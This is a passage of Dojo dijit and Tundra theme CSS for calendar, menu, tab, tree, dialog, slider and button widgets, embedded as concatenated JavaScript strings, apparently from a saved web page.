'.dijitCalendarContainer thead tr th, .dijitCalendarContainer thead tr td, .dijitCalendarContainer tbody tr td, .dijitCalendarContainer tfoot tr td {'+
' padding: 0;'+
'}'+
''+
'.dijitCalendarNextYear {'+
' margin:0 0 0 0.55em;'+
'}'+
''+
'.dijitCalendarPreviousYear {'+
' margin:0 0.55em 0 0;'+
'}'+
''+
'.dijitCalendarIncrementControl {'+
' cursor:pointer;'+
' vertical-align: middle;'+
'}'+
''+
'.dijitCalendarDisabledDate {'+
' color:gray !important;'+
'}'+
''+
'.dijitCalendarBodyContainer tbody tr td {'+
' cursor:pointer;'+
'}'+
''+
'.dijitCalendarPreviousMonthDisabled,'+
'.dijitCalendarCurrentMonthDisabled,'+
'.dijitCalendarNextMonthDisabled {'+
' cursor:default !important'+
'}'+
''+
'.dijitCalendarDateTemplate,'+
'.dijitCalendarSelectedYear,'+
'.dijitCalendarNextYear,'+
'.dijitCalendarPreviousYear {'+
' cursor:pointer;'+
'}'+
''+
'.dijitCalendarMonthLabelSpacer {'+
' /* don\'t display it, but make it affect the width */'+
'   position: relative;'+
'   height: 1px;'+
'   overflow: hidden;'+
'   visibility: hidden;'+
'}'+
''+
''+
'/* Menu */'+
''+
'.dijitMenu {'+
' border:1px solid black;'+
' background-color:white;'+
'}'+
'.dijitMenuTable {'+
' margin:1px 0;'+
' border-collapse:collapse;'+
' border-width:0;'+
' background-color:white;'+
'}'+
''+
'/* workaround for webkit bug #8427, remove this when it is fixed upstream */'+
'.dj_webkit .dijitMenuTable td[colspan="2"]{'+
' border-right:hidden;'+
'}'+
''+
'.dijitMenuItem{'+
' text-align: left;'+
' white-space: nowrap;'+
' padding:.1em .2em;'+
' cursor:pointer;'+
'}'+
''+
'.dijitMenuPassive .dijitMenuItemHover,'+
'.dijitMenuItemSelected {'+
' /*'+
'  * dijitMenuItemHover refers to actual mouse over'+
'  * dijitMenuItemSelected is used after a menu has been "activated" by'+
'  * clicking it, tabbing into it, or being opened from a parent menu,'+
'  * and denotes that the menu item has focus or that focus is on a child'+
'  * menu'+
'  */'+
' background-color:black;'+
' color:white;'+
'}'+
''+
'.dijitMenuItemIcon, .dijitMenuExpand {'+
' background-repeat: no-repeat;'+
'}'+
''+
'.dijitMenuItemDisabled * {'+
' /* for a disabled menu item, just set it to mostly transparent */'+
' opacity:0.3;'+
' cursor:default;'+
'}'+
'.dj_ie .dijit_a11y .dijitMenuItemDisabled td,'+
'.dj_ie .dijitMenuItemDisabled *,'+
'.dj_ie .dijitMenuItemDisabled td {'+
' color:gray !important;'+
' filter: alpha(opacity=35);'+
'}'+
''+
'.dijitMenuItemLabel {'+
' position: relative;'+
' vertical-align: middle;'+
'}'+
''+
'.dijit_a11y .dijitMenuItemSelected .dijitMenuItemLabel {'+
' border-width: 1px;'+
' border-style: solid;'+
'}'+
'.dijit_a11y .dijitMenuItemSelected {'+
' border: 1px #fff dotted !important;'+
'}'+
''+
'.dijitMenuExpandA11y {'+
' display: none;'+
'}'+
'.dijit_a11y .dijitMenuExpandA11y {'+
' display: inline;'+
'}'+
''+
'.dijitMenuSeparator td {'+
' border: 0;'+
' padding: 0;'+
'}'+
''+
'/* separator can be two pixels -- set border of either one to 0 to have only one */'+
'.dijitMenuSeparatorTop {'+
' height: 50%;'+
' margin: 0;'+
' margin-top:3px;'+
' font-size: 1px;'+
'}'+
''+
'.dijitMenuSeparatorBottom {'+
' height: 50%;'+
' margin: 0;'+
' margin-bottom:3px;'+
' font-size: 1px;'+
'}'+
''+
'/* the checked menu item */'+
'.dijitCheckedMenuItemIconChar {'+
' vertical-align: middle;'+
' visibility:hidden;'+
'}'+
'.dijitCheckedMenuItemChecked .dijitCheckedMenuItemIconChar {'+
' visibility: visible;'+
'}'+
'.dijit_a11y .dijitCheckedMenuItemIconChar {'+
' display:inline !important;'+
'}'+
'.dijit_a11y .dijitCheckedMenuItemIcon {'+
' display: none;'+
'}'+
''+
''+
'/* Stack */'+
''+
'.dijitStackController .dijitToggleButtonChecked * {'+
' cursor: default;	/* because pressing it has no effect */'+
'}'+
''+
'/* Tab */'+
''+
'.dijitTabContainerBottom-tabs,'+
'.dijitTabContainerTop-tabs,'+
'.dijitTabContainerLeft-tabs,'+
'.dijitTabContainerRight-tabs {'+
' z-index:10;'+
' overflow: visible !important;  /* so tabs can cover up border adjacent to container */'+
'}'+
''+
'.dijitTabContainerBottom-container,'+
'.dijitTabContainerTop-container,'+
'.dijitTabContainerLeft-container,'+
'.dijitTabContainerRight-container {'+
' z-index:0;'+
' overflow: hidden;'+
' border: 1px solid black;'+
'}'+
''+
'.dijitTabContainerTop-tabs {'+
' border-bottom: 1px solid black;'+
'}'+
'.dijitTabContainerTop-container {'+
' border-top: 0px;'+
'}'+
''+
'.dijitTabContainerLeft-tabs {'+
' border-right: 1px solid black;'+
'}'+
'.dijitTabContainerLeft-container {'+
' border-left: 0px;'+
'}'+
''+
'.dijitTabContainerBottom-tabs {'+
' border-top: 1px solid black;'+
'}'+
'.dijitTabContainerBottom-container {'+
' border-bottom: 0px;'+
'}'+
''+
'.dijitTabContainerRight-tabs {'+
' border-left: 1px solid black'+
'}'+
'.dijitTabContainerRight-container {'+
' border-right: 0px;'+
'}'+
''+
''+
'.dijitTab {'+
' position:relative;'+
' cursor:pointer;'+
' white-space:nowrap;'+
' z-index:3;'+
'}'+
'.dijitTabChecked {'+
' cursor: default;	/* because clicking will have no effect */'+
'}'+
''+
'.dijitTabContainerTop-tabs .dijitTab {'+
' top: 1px;	/* to overlap border on .dijitTabContainerTop-tabs */'+
'}'+
'.dijitTabContainerBottom-tabs .dijitTab {'+
' top: -1px;	/* to overlap border on .dijitTabContainerBottom-tabs */'+
'}'+
'.dijitTabContainerLeft-tabs .dijitTab {'+
' left: 1px;	/* to overlap border on .dijitTabContainerLeft-tabs */'+
'}'+
'.dijitTabContainerRight-tabs .dijitTab {'+
' left: -1px;	/* to overlap border on .dijitTabContainerRight-tabs */'+
'}'+
''+
''+
'.dijitTabContainerTop-tabs .dijitTab,'+
'.dijitTabContainerBottom-tabs .dijitTab {'+
' /* Inline-block */'+
' display:-moz-inline-box;		/* FF2 */'+
' display:inline-block;			/* webkit and FF3 */'+
' #zoom: 1; /* set hasLayout:true to mimic inline-block */'+
' #display:inline; /* don\'t use .dj_ie since that increases the priority */'+
'}'+
''+
'.dijitTabInnerDiv {'+
' position:relative;'+
'}'+
''+
'/* images off, high-contrast mode styles */'+
'.dijitTab .closeText {'+
' display:none;'+
'}'+
''+
'.dijit_a11y .closeText {'+
' display:inline;'+
' margin: 0px 6px;'+
'}'+
''+
'.dijit_a11y .dijitTab .closeImage {'+
' display:none;'+
'}'+
''+
'.dijit_a11y .closeButton-hover .closeText {'+
' border:thin solid;'+
'}'+
'.dijit_a11y .dijitTabChecked {'+
' border-style:dashed !important;'+
'}'+
''+
'.dijit_a11y .dijitTabInnerDiv {'+
' border-left:none !important;'+
' }'+
''+
'.dijitTabPane,'+
'.dijitStackContainer-child,'+
'.dijitAccordionContainer-child {'+
' /* children of TabContainer, StackContainer, and AccordionContainer shouldn\'t have borders'+
'  * b/c a border is already there from the TabContainer/StackContainer/AccordionContainer itself.'+
'  */'+
'    border: none !important;'+
'}'+
''+
'.dijitInlineEditor {'+
' /* span around an inline-editable value when in edit mode */'+
' position:relative;'+
' vertical-align:bottom;'+
'}'+
'.dj_ie .dijitInlineEditor {'+
' vertical-align:middle;'+
'}'+
''+
'.dijitInlineValue {'+
' /* span around an inline-editable value when NOT in edit mode */'+
'}'+
''+
'.dijitInlineEditor .dijitButtonContainer {'+
' /* div around the buttons -- makes them float below the field */'+
' position:absolute;'+
' right:0;'+
' overflow:visible;'+
'}'+
''+
'.dijitInlineEditor .saveButton,'+
'.dijitInlineEditor .cancelButton {'+
'}'+
''+
'/* Tree */'+
''+
'.dijitTreeRow, .dijitTreeContent {'+
' white-space: nowrap;'+
'}'+
''+
'.dijitTreeRow img {'+
' /* make the expando and folder icons line up with the label */'+
' vertical-align: middle;'+
'}'+
''+
'.dijitTreeContent {'+
'    cursor: default;'+
'}'+
''+
'.dojoDndTargetDisabled,'+
'.dojoDndTargetDisabled .dijitTreeContent {'+
'    cursor: not-allowed;'+
'}'+
''+
'.dijitExpandoText {'+
' display: none;'+
'}'+
''+
'.dijit_a11y .dijitExpandoText {'+
' display: inline;'+
' padding-left: 10px;'+
' padding-right: 10px;'+
' font-family: monospace;'+
' border-style: solid;'+
' border-width: thin;'+
' cursor: pointer;'+
'}'+
''+
'.dijitTreeLabel {'+
' margin: 0px 4px;'+
'}'+
''+
'/* Dialog */'+
''+
'.dijitDialog {'+
' position: absolute;'+
' z-index: 999;'+
' padding: 1px;'+
'     overflow: hidden;       /* override overflow: auto; from ContentPane to make dragging smoother */'+
'}'+
''+
'.dj_ff2 .dijitDialog {'+
'     overflow: auto;          /* avoid disappearing cursor problem, see #7408 */'+
'}'+
''+
'.dijitDialogFixed div.dijitDialogTitleBar {'+
' cursor:default;'+
'}'+
''+
'.dijitDialogUnderlayWrapper {'+
' position: absolute;'+
' left: 0;'+
' top: 0;'+
' z-index: 998;'+
' display: none;'+
' background: transparent !important;'+
'}'+
''+
'.dijitDialogUnderlay {'+
' background: #eee;'+
' opacity: 0.5;'+
'}'+
''+
'.dj_ie .dijitDialogUnderlay {'+
' filter: alpha(opacity=50);'+
'}'+
''+
'/* images off, high-contrast mode styles */'+
'.dijit_a11y .dijitInputLayoutContainer,'+
'.dijit_a11y .dijitDialog {'+
' opacity: 1 !important;'+
' background-color: white !important;'+
'}'+
''+
'.dijitDialog .closeText {'+
' display:none;'+
' /* for the onhover border in high contrast on IE: */'+
' position:absolute;'+
'}'+
''+
'.dijit_a11y .dijitDialog .closeText {'+
' display:inline;'+
'}'+
''+
'.dijitSliderMoveable {'+
' z-index:99;'+
' position:absolute !important;'+
' display:block;'+
' vertical-align:middle;'+
'}'+
''+
'.dijitSliderMoveableH {'+
' right:0;'+
'}'+
''+
'.dijit_a11y div.dijitSliderImageHandle,'+
'.dijitSliderImageHandle {'+
' margin:0;'+
' padding:0;'+
' position:absolute !important;'+
' border:8px solid gray;'+
' width:0;'+
' height:0;'+
'}'+
'.dijit_a11y .dijitSliderFocused .dijitSliderImageHandle {'+
' border:4px solid #000;'+
' height:8px;'+
' width:8px;'+
'}'+
''+
'.dijitSliderImageHandleV {'+
' top:-8px;'+
' left:-6px;'+
'}'+
''+
'.dijitSliderImageHandleH {'+
' left:-8px;'+
' top:-5px;'+
' vertical-align:top;'+
'}'+
''+
'.dijitSliderBar {'+
' border-style:solid;'+
' border-color:black;'+
'}'+
''+
'.dijitSliderBarContainerV {'+
' position:relative;'+
' height:100%;'+
' z-index:1;'+
'}'+
''+
'.dijitSliderBarContainerH {'+
' position:relative;'+
' z-index:1;'+
'}'+
''+
'.dijitSliderBarH {'+
' height:4px;'+
' border-width:1px 0;'+
'}'+
''+
'.dijitSliderBarV {'+
' width:4px;'+
' border-width:0 1px;'+
'}'+
''+
'.dijitSliderProgressBar {'+
' background-color:red;'+
' z-index:1;'+
'}'+
''+
'.dijitSliderProgressBarV {'+
' position:static !important;'+
' height:0%;'+
' vertical-align:top;'+
' text-align:left;'+
'}'+
''+
'.dijitSliderProgressBarH {'+
' position:absolute !important;'+
' width:0%;'+
' vertical-align:middle;'+
' overflow:visible;'+
'}'+
''+
'.dijitSliderRemainingBar {'+
' overflow:hidden;'+
' background-color:transparent;'+
' z-index:1;'+
'}'+
''+
'.dijitSliderRemainingBarV {'+
' height:100%;'+
' text-align:left;'+
'}'+
''+
'.dijitSliderRemainingBarH {'+
' width:100% !important;'+
'}'+
''+
'/* the slider bumper is the space consumed by the slider handle when it hangs over an edge */'+
'.dijitSliderBumper {'+
' overflow:hidden;'+
' z-index:1;'+
'}'+
''+
'.dijitSliderBumperV {'+
' width:4px;'+
' height:8px;'+
' border-width:0 1px;'+
'}'+
''+
'.dijitSliderBumperH {'+
' width:8px;'+
' height:4px;'+
' border-width:1px 0;'+
'}'+
''+
'.dijitSliderBottomBumper,'+
'.dijitSliderLeftBumper {'+
' background-color:red;'+
'}'+
''+
'.dijitSliderTopBumper,'+
'.dijitSliderRightBumper {'+
' background-color:transparent;'+
'}'+
''+
'.dijitSliderDecorationH {'+
' text-align:center;'+
'}'+
''+
'.dijitSlider .dijitSliderButton {'+
' font-family:monospace;'+
' margin:0;'+
' padding:0;'+
' display:block;'+
'}'+
''+
'.dijit_a11y .dijitSliderButtonInner {'+
' visibility:visible !important;'+
'}'+
''+
'.dijitSliderButtonContainer {'+
' text-align:center;'+
' height:0;'+
'}'+
''+
'.dijitSlider .dijitButtonNode {'+
' padding:0;'+
' display:block;'+
'}'+
''+
'.dijitRuleContainer {'+
' position:relative;'+
' overflow:visible;'+
'}'+
''+
'.dijitRuleContainerV {'+
' height:100%;'+
' line-height:0;'+
' float:left;'+
' text-align:left;'+
'}'+
''+
'.dj_opera .dijitRuleContainerV {'+
' line-height:2%;'+
'}'+
''+
'.dj_ie .dijitRuleContainerV {'+
' line-height:normal;'+
'}'+
''+
'.dj_gecko .dijitRuleContainerV {'+
' margin:0 0 1px 0; /* mozilla bug workaround for float:left,height:100% block elements */'+
'}'+
''+
'.dijitRuleMark {'+
' position:absolute;'+
' border:1px solid black;'+
' line-height:0;'+
' height:100%;'+
'}'+
''+
'.dijitRuleMarkH {'+
' width:0;'+
' border-top-width:0 !important;'+
' border-bottom-width:0 !important;'+
' border-left-width:0 !important;'+
'}'+
''+
'.dijitRuleLabelContainer {'+
' position:absolute;'+
'}'+
''+
'.dijitRuleLabelContainerH {'+
' text-align:center;'+
' display:inline-block;'+
'}'+
''+
'.dijitRuleLabelH {'+
' position:relative;'+
' left:-50%;'+
'}'+
''+
'.dijitRuleMarkV {'+
' height:0;'+
' border-right-width:0 !important;'+
' border-bottom-width:0 !important;'+
' border-left-width:0 !important;'+
' width:100%;'+
' left:0;'+
'}'+
''+
'.dj_ie .dijitRuleLabelContainerV {'+
' margin-top:-.55em;'+
'}'+
''+
'/* Toolbar A11y */'+
'.dijit_a11y .dijitButtonContents .dijitButtonText {'+
' display: inline !important;'+
'}'+
''+
'.dijitTextArea {'+
' width:100%;'+
' overflow-y: auto;	/* w/out this IE\'s SimpleTextArea goes to overflow: scroll */'+
'}'+
'.dijitTextArea[cols] {'+
' width:auto; /* SimpleTextArea cols */'+
'}'+
'.dj_ie .dijitTextAreaCols {'+
' width:auto;'+
'}'+
'.dijitTextArea > DIV {'+
' text-decoration:none;'+
' overflow:auto;'+
' min-height: 1.40em;'+
'}'+
''+
'.dj_ie .dijitTextArea p {'+
' margin-top:0;'+
' margin-bottom:0;'+
' line-height: normal !important;'+
'}'+
''+
'.dijitToolbarSeparator {'+
' height: 18px;'+
' width: 5px;'+
' padding: 0 1px;'+
' margin: 0;'+
'}'+
''+
'/* Editor */'+
'.dijitIEFixedToolbar {'+
' position:absolute;'+
' /* top:0; */'+
' top: expression(eval((document.documentElement||document.body).scrollTop));'+
'}'+
''+
'.RichTextEditable {'+
' display: block;	/* prevents glitch on FF with InlineEditBox, see #8404 */'+
'}'+
''+
'/* TimePicker */'+
''+
'.dijitTimePickerItemInner {'+
' text-align:center;'+
' border:0;'+
' padding:2px 8px 2px 8px;'+
'}'+
''+
'.dijitTimePickerTick,'+
'.dijitTimePickerMarker {'+
' border-bottom:1px solid gray;'+
'}'+
''+
'.dijitTimePicker .dijitDownArrowButton {'+
' border-top: none !important;'+
'}'+
''+
'.dijitTimePickerTick {'+
' color:#CCC;'+
'}'+
''+
'.dijitTimePickerMarker {'+
' color:black;'+
' background-color:#CCC;'+
'}'+
''+
'.dijitTimePickerItemSelected {'+
' font-weight:bold;'+
' color:#333;'+
' background-color:#b7cdee;'+
'}'+
''+
'.dijitTimePickerItemHover {'+
' background-color:gray;'+
' color:white;'+
' cursor:pointer;'+
'}'+
''+
'.dijit_a11y .dijitTimePickerItem {'+
' border-bottom:1px solid #333;'+
'}'+
''+
''+
'/* Disable the high contrast character */'+
'.dijitToggleButtonIconChar {'+
' display:none !important;'+
'}'+
'.dijit_a11y .dijitToggleButtonIconChar {'+
' display:inline !important;'+
'}'+
''+
'.dijit_a11y .dijitToggleButtonIconChar {'+
' visibility:hidden;'+
'}'+
'.dijit_a11y .dijitToggleButtonChecked .dijitToggleButtonIconChar {'+
' visibility:visible !important;'+
'}'+
''+
'.dijitArrowButtonChar {'+
' display:none !important;'+
'}'+
'.dijit_a11y .dijitArrowButtonChar {'+
' display:inline !important;'+
'}'+
'.dijitInputLayoutContainer {'+
' position: relative;'+
' overflow: hidden;'+
'}'+
'.dijitSpinnerButtonContainer {'+
' float: right;'+
' width: 18px;'+
' position: relative;'+
' overflow: hidden;'+
'}'+
'.dijitSpinner .dijitInputLayoutContainer .dijitArrowButton {'+
' height: 50%;'+
' width: 16px;'+
' overflow: hidden;'+
'}'+
'.dijitSpinner .dijitInputLayoutContainer .dijitArrowButtonInner {'+
' overflow: hidden;'+
' line-height: 50%;'+
'}'+
'.dijit_a11y .dijitSpinner .dijitInputLayoutContainer .dijitArrowButton {'+
' width: 100%;'+
'}'+
'.dijit_a11y .dijitSpinner .dijitArrowButton .dijitArrowButtonChar {'+
' font-size: 0.4em;'+
' vertical-align: top;'+
'}'+
'.dijit_a11y .dijitSpinnerButtonContainer {'+
' width: 0.5em;'+
' margin-left: 2px;'+
' overflow: visible;'+
'}'+
'.dijit_a11y .dijitSpinnerButtonContainer .dijitButtonNode {'+
' border-width: 1px 0px 0px 1px;'+
' border-style: solid !important;'+
'}'+
''+
'   /*savepage-import-url=../../../js/dojotoolkit/dijit/themes/dijit_rtl.css*/.dj_gecko-rtl .dijitInputField {'+
' direction: ltr; /* Firefox needs this - probably a bug */'+
'}'+
'.dj_gecko-rtl .dijitInputField * {'+
' direction: rtl; /* Firefox needs dijitInputField to be ltr, so fix the contained tags */'+
'}'+
''+
'/* ComboBox */'+
'.dijitRtl .dijitMenuItem {'+
' text-align: right;'+
'}'+
''+
'/* Tree */'+
''+
'.dijitRtl .dijitComboBox .dijitInputField {'+
' border-right-width:1px !important;'+
' border-left-width:0 !important;'+
'}'+
''+
'/* Calendar */'+
''+
'.dijitRtl .dijitCalendarNextYear {'+
' margin:0 0.55em 0 0;'+
'}'+
''+
'.dijitRtl .dijitCalendarPreviousYear {'+
' margin:0 0 0 0.55em;'+
'}'+
''+
'.dijitRtl .dijitProgressBarFull .dijitProgressBarLabel {'+
' right:0; /* FF workaround */'+
'}'+
''+
'/* Slider */'+
''+
'.dijitRtl .dijitSliderImageHandleV {'+
' left:auto;'+
' right:-6px;'+
'}'+
''+
'.dj_ie-rtl .dijitSliderImageHandleV {'+
' right:-10px;'+
'}'+
''+
'.dijitRtl .dijitSliderMoveableH {'+
' right:auto;'+
' left:0;'+
'}'+
''+
'.dijitRtl .dijitRuleContainerV {'+
' float:right;'+
'}'+
''+
'.dj_gecko-rtl .dijitRuleContainerV {'+
' float:left;'+
'}'+
''+
'.dj_ie-rtl .dijitRuleContainerV {'+
' text-align:right;'+
'}'+
''+
'.dj_ie-rtl .dijitRuleLabelV {'+
' text-align:left;'+
'}'+
''+
'.dj_ie-rtl .dijitRuleLabelH {'+
' zoom:1;'+
'}'+
''+
'.dj_ie-rtl .dijitSliderProgressBarH {'+
' right:0;'+
' left:auto;'+
'}'+
''+
'.dj_gecko-rtl .dijitSliderProgressBarH {'+
' float:right;'+
' right:0;'+
' left:auto;'+
'}'+
''+
'/* Spinner */'+
''+
'.dijitRtl .dijitSpinner .dijitInputLayoutContainer .dijitArrowButton {'+
' right: auto;'+
' left: 0;'+
' border-width: 0 1px 0 0 !important;'+
'}'+
''+
'.dijitRtl .dijitSpinnerButtonContainer {'+
' float: left;'+
'}'+
''+
'.dijitRtl .dijit_a11y .dijitSpinnerButtonContainer {'+
' margin-left: none;'+
' margin-right: 2px;'+
'}'+
''+
'.dijitRtl DIV.dijitArrowButton, .dijitRtl .dijitValidationIcon, .dijitRtl .dijitValidationIconText {'+
' float: left;'+
'}'+
''+
'/* ContentPane*/'+
'.dijitRtl .dijitContentPaneLoading, .dijitRtl .dijitContentPaneError {'+
' background-position:right;'+
' padding-right:25px;'+
'}'+
''+
'   /*savepage-import-url=../../../js/dojotoolkit/dijit/themes/tundra/form/Button.css*/'+
'/*****'+
'  dijit.form.Button'+
'  dijit.form.DropDownButton'+
'  dijit.form.ComboButton'+
'  dijit.form.ComboBox (partial)'+
' *****/'+
''+
'.tundra .dijitButtonNode {'+
' /* enabled state - inner */'+
' border: 1px solid #c0c0c0;'+
' border-bottom: 1px solid #9b9b9b;'+
' padding: 0.1em 0.2em 0.2em 0.2em;'+
' background: #fff /*savepage-url=../images/buttonEnabled.png*/ var(--savepage-url-10) repeat-x bottom left;'+
'}'+
''+
'.tundra .dijitButtonNode button {'+
' border: 0px;'+
' background-color: transparent;'+
'}'+
' '+
'.tundra .dijitButtonText {'+
' text-align: center;'+
' padding: 0 0.3em;'+
'}'+
''+
'.tundra .dijitDisabled .dijitButtonText {'+
' color: #7F7F7F;'+
'}'+
''+
'/*'+
'.tundra .dijitComboBox .dijitButtonNode {'+
' border: 0px;'+
'}'+
'*/'+
''+
'.tundra .dijitArrowButton {'+
' color: #111;'+
'}'+
''+
'.tundra .dijitComboButton .dijitDownArrowButton {'+
' padding-right:4px;'+
'}'+
''+
'.dj_ff2 .tundra .dijitComboButton .dijitButtonContentsFocused,'+
'.dj_ff2 .tundra .dijitComboButton .dijitDownArrowButtonFocused {'+
' border: 1px solid transparent; /*make transparent so FF2 focus rect. is visible */'+
'}'+
''+
'.tundra .dijitButtonDisabled .dijitButtonNode,'+
'.tundra .dijitToggleButtonDisabled .dijitButtonNode,'+
'.tundra .dijitDropDownButtonDisabled .dijitButtonNode,'+
'.tundra .dijitComboButtonDisabled .dijitButtonNode,'+
'.tundra .dijitComboBoxDisabled,'+
'.tundra .dijitSpinnerDisabled,'+
'.tundra .dijitSpinnerDisabled .dijitButtonNode {'+
' /* disabled state - inner */'+
' /* border-color: #d5d5d5 #bdbdbd #bdbdbd #d5d5d5; */'+
' border-color: #d5d5d5 #d5d5d5 #bdbdbd #d5d5d5;'+
' background:#e4e4e4 /*savepage-url=../images/buttonDisabled.png*/ url() top repeat-x;'+
'}'+
''+
'.tundra .dijitButtonHover .dijitButtonNode,'+
'.tundra .dijitButtonNodeHover,'+
'.tundra .dijitToggleButtonHover .dijitButtonNode,'+
'.tundra .dijitDropDownButtonHover .dijitButtonNode,'+
'.tundra .dijitComboButtonHover .dijitButtonContents,'+
'.tundra .dijitComboButtonDownArrowHover .dijitDownArrowButton {'+
' /* hover state - inner */'+
' /* TODO: change from Hover to Selected so that button is still highlighted while drop down is being used */'+
' border-color:		#a5beda;'+
' border-bottom-color:#5c7590;'+
' color:#243C5F;'+
' background:#fcfdff /*savepage-url=../images/buttonHover.png*/ url() repeat-x bottom;'+
'}'+
'.tundra .dijitComboBoxHover .dijitDownArrowButton,'+
'.tundra .dijitSpinnerUpArrowHover .dijitUpArrowButton,'+
'.tundra .dijitSpinnerDownArrowHover .dijitDownArrowButton {'+
' /* same as above except don\'t adjust border color (it\'s controlled by the containing Spinner/ComboBox) */'+
' color:#243C5F;'+
' background:#fcfdff /*savepage-url=../images/buttonHover.png*/ url() repeat-x bottom;'+
'}'+
''+
'.tundra .dijitSpinnerUpArrowActive .dijitUpArrowButton,'+
'.tundra .dijitSpinnerDownArrowActive .dijitDownArrowButton,'+
'.tundra .dijitButtonActive .dijitButtonNode,'+
'.tundra .dijitToggleButtonActive .dijitButtonNode,'+
'.tundra .dijitDropDownButtonActive .dijitButtonNode,'+
'.tundra .dijitComboButtonActive .dijitButtonContents,'+
'.tundra .dijitDownArrowActive .dijitDownArrowButton,'+
'.tundra .dijitComboBoxActive .dijitDownArrowButton,'+
'.tundra .dijitStackController .dijitToggleButtonChecked .dijitButtonNode {'+
' /* active state - inner (for when you are pressing a normal button, or'+
'  * when a radio-type button is in a depressed state'+
'  */'+
' border-color:#366dba;'+
' background: #ededed /*savepage-url=../images/buttonActive.png*/ url() bottom repeat-x;'+
'}'+
''+
'.tundra .dijitArrowButtonInner {'+
' background-image:/*savepage-url=../images/spriteArrows.png*/url();'+
' background-position: left top;'+
' width: 7px;'+
' height: 7px;'+
' font-size: 1px;'+
' margin: 0px 4px 0px 5px;'+
'}'+
'.dj_ie6 .tundra .dijitArrowButtonInner {'+
' background-image:/*savepage-url=../images/spriteArrows.gif*/url();'+
'}'+
'.tundra .dijitDisabled .dijitArrowButtonInner {'+
' background-position: -28px top;'+
'}'+
'.tundra .dijitUpArrowButton .dijitArrowButtonInner {'+
' background-position: -21px top;'+
'}'+
''+
'.tundra .dijitDisabled .dijitUpArrowButton .dijitArrowButtonInner {'+
' background-position: -49px top;'+
'}'+
''+
''+
'/* Since ComboBox doesn\'t have it\'s own file... */'+
'.tundra .dijitComboBox .dijitArrowButton .dijitArrowButtonInner {'+
' background-image: /*savepage-url=../images/comboArrowDown.gif*/ url();'+
' background-repeat: no-repeat;'+
' background-attachment: scroll;'+
' background-position: center center;'+
' height: auto;'+
' font-size: 100%;'+
' font-size: inherit;'+
'}'+
'.tundra .dijitComboBoxHover .dijitArrowButtonInner {'+
' /* TODO: url("../images/arrowDownHover.png") but in IE6 it flickers some? */'+
'}'+
''+
'/* Since Spinner doesn\'t have it\'s own file */'+
'.tundra .dijitSpinner .dijitArrowButtonInner {'+
' display: block;  /* inline just isnt going to work for us here IMO */'+
' position:absolute;'+
' top: 50%;'+
' margin-top: -4px; /* half its height */'+
' left: 50%;'+
' margin-left: -4px; /* half its width */'+
' line-height: 2px;'+
'}'+
''+
'   /*savepage-import-url=../../../js/dojotoolkit/dojox/form/resources/DropDownSelect.css*//*'+
'**----------------------------------------------------------------------------'+
'**  DropDownSelect'+
'**----------------------------------------------------------------------------'+
'/* Mirror dijitDropDownButton as far as padding/spacing goes */'+
'.dojoxDropDownSelect {'+
' margin: 0.2em;'+
'}'+
'.dojoxDropDownSelect .dijitButtonNode {'+
' text-align: left;'+
'}'+
'.dijitRtl .dojoxDropDownSelect .dijitButtonNode {'+
' text-align: right;'+
'}'+
'.dijitToolbar .dojoxDropDownSelect {'+
' margin: 0;'+
'}'+
'.dj_webkit .dijitToolbar .dojoxDropDownSelect {'+
' padding-left: 0.3em;'+
'}'+
'.dijit_a11y .dojoxDropDownSelectDisabled .dijitButtonNode {'+
' border-style: outset!important;'+
' border-width: medium!important;'+
' border-color: #999 !important;'+
' color:#999 !important;'+
'}'+
'.dojoxDropDownSelect .dijitButtonContents {'+
' padding: 0px;'+
' border-right: none;'+
' background: transparent none;'+
'}'+
'.dojoxDropDownSelectFixedWidth .dijitButtonContents {'+
' width: 100%;'+
'}'+
'.dojoxDropDownSelect .dijitArrowButton {'+
' width: 16px;'+
'}'+
''+
'/* Fix the baseline of our label (for multi-size font elements) */'+
'.dojoxDropDownSelectLabel *'+
'{'+
' vertical-align: baseline;'+
'}'+
''+
'/* Styling for the currently-selected option (rich text can mess this up) */'+
'.dojoxDropDownSelectSelectedOption * {'+
' font-weight: bold;'+
'}'+
''+
'/* Fix the styling of the dropdown menu to be more combobox-like */'+
'.dojoxDropDownSelectMenu {'+
' border-width: 1px;'+
'}'+
''+
'/* Style the different areas of the button to look like a "real" dropdown */'+
'.dojoxDropDownSelect .dijitButtonContents {'+
' white-space: nowrap;'+
'}'+
''+
'/*'+
'**----------------------------------------------------------------------------'+
'**  Tundra stylings'+
'**----------------------------------------------------------------------------'+
'*/'+
'/* Cursor States */'+
'.tundra .dojoxDropDownSelectDisabled * {'+
'    cursor: not-allowed !important;'+
'}'+
'.tundra .dojoxDropDownSelectReadOnly * {'+
'    cursor: default !important;'+
'}'+
'.tundra .dojoxDropDownSelect .dijitButtonNode {'+
' padding: 0px;'+
'}'+
''+
'/* Make unselected content portion "look" more like a text box and less like a button */'+
'.tundra .dojoxDropDownSelect .dijitButtonContents {'+
' padding-top: 1px;'+
'    background:#fff /*savepage-url=../../../dijit/themes/tundra/images/validationInputBg.png*/ url() repeat-x top left;'+
'    #background:#fff /*savepage-url=../../../dijit/themes/tundra/images/validationInputBg.gif*/ url() repeat-x top left;'+
'}'+
'.tundra .dojoxDropDownSelectHover .dijitButtonContents,'+
'.tundra .dojoxDropDownSelectActive .dijitButtonContents,'+
'.tundra .dojoxDropDownSelectOpened .dijitButtonContents,'+
'.tundra .dojoxDropDownSelectDisabled .dijitButtonContents,'+
'.tundra .dojoxDropDownSelectReadOnly .dijitButtonContents{'+
' background: transparent none;'+
'}'+
'.dj_ie .tundra .dojoxDropDownSelect .dijitButtonContents {'+
' padding-top: 0px;'+
'}'+
''+
'/* Mirror DropDownButton */'+
'.tundra .dojoxDropDownSelectDisabled .dijitButtonNode {'+
'    border-color: #d5d5d5 #bdbdbd #bdbdbd #d5d5d5;'+
'    background:#e4e4e4 /*savepage-url=../../../dijit/themes/tundra/images/buttonDisabled.png*/ url() top repeat-x;'+
'}'+
'.dj_ie .tundra .dojoxDropDownSelectDisabled  .dijitButtonNode * {'+
' filter: gray() alpha(opacity=50);'+
'}'+
''+
'.tundra .dojoxDropDownSelectHover .dijitButtonNode {'+
'    border-color:#a5beda;'+
'    border-bottom-color:#5c7590;'+
'    border-right-color:#5c7590;'+
'    color:#243C5F;'+
'    background:#fcfdff /*savepage-url=../../../dijit/themes/tundra/images/buttonHover.png*/ url() repeat-x bottom;'+
'}'+
''+
'.tundra .dojoxDropDownSelectActive .dijitButtonNode,'+
'.tundra .dojoxDropDownSelectOpened .dijitButtonNode {'+
'    border-color:#366dba;'+
